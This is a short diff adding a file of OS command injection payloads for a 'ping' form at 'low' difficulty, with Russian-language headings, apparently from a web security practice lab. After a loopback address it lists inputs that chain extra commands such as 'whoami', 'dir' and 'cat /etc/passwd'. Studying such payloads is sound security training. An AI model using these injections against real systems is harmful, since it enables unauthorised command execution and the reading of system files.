@@ -1,0 +1,7 @@
+# OS Command Injection — ping (уровень low)
+# Раздел: Injection → OS Command Injection
+
+127.0.0.1
+127.0.0.1; whoami
+127.0.0.1 && dir
+127.0.0.1 | cat /etc/passwd
